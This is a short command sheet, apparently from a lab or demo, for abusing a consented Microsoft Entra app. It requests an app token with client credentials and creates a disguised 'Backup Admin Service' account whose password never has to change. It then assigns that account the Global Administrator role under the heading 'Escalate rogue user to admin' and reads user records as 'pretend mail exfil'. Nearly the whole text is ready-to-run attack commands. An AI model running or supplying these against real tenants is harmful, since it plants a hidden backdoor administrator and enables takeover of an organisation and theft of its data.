# Commands

## App consent

```sh
https://login.microsoftonline.com/<TENANT-ID>/adminconsent?client_id=<APP-ID>
```

## Get app's bearer token

```sh
curl -X POST https://login.microsoftonline.com/<TENANT-ID>/oauth2/v2.0/token \
-d "client_id=<APP-ID>" \
-d "client_secret=<APP-SECRET>" \
-d "scope=https://graph.microsoft.com/.default" \
-d "grant_type=client_credentials"
```

## Add user to tenant

```sh
curl -X POST "https://graph.microsoft.com/v1.0/users" \
-H "Authorization: Bearer <TOKEN>" \
-H "Content-Type: application/json" \
-d '{
  "accountEnabled": true,
  "displayName": "Backup Admin Service",
  "mailNickname": "backupadmin",
  "userPrincipalName": "backupadmin@<TENANT-DOMAIN>.onmicrosoft.com",
  "passwordProfile": {
    "forceChangePasswordNextSignIn": false,
    "password": "<PASSWORD>"
  }
}'
```

## Escalate rogue user to admin

```sh
curl -X POST "https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments" \
-H "Authorization: Bearer <TOKEN>" \
-H "Content-Type: application/json" \
-d '{
  "principalId": "<USER-OBJECT-ID>",
  "roleDefinitionId": "62e90394-69f5-4237-9190-012177145e10",
  "directoryScopeId": "/"
}'
```

## READ USERS (Cant read mail since no mailboxes exist - we will just use the User.Read.All permission as pretend mail exfil)

```sh
curl -X GET "https://graph.microsoft.com/v1.0/users/<USERNAME>@<TENANT-DOMAIN>.onmicrosoft.com" \
-H "Authorization: Bearer <TOKEN>" \
-H "Content-Type: application/json"
```
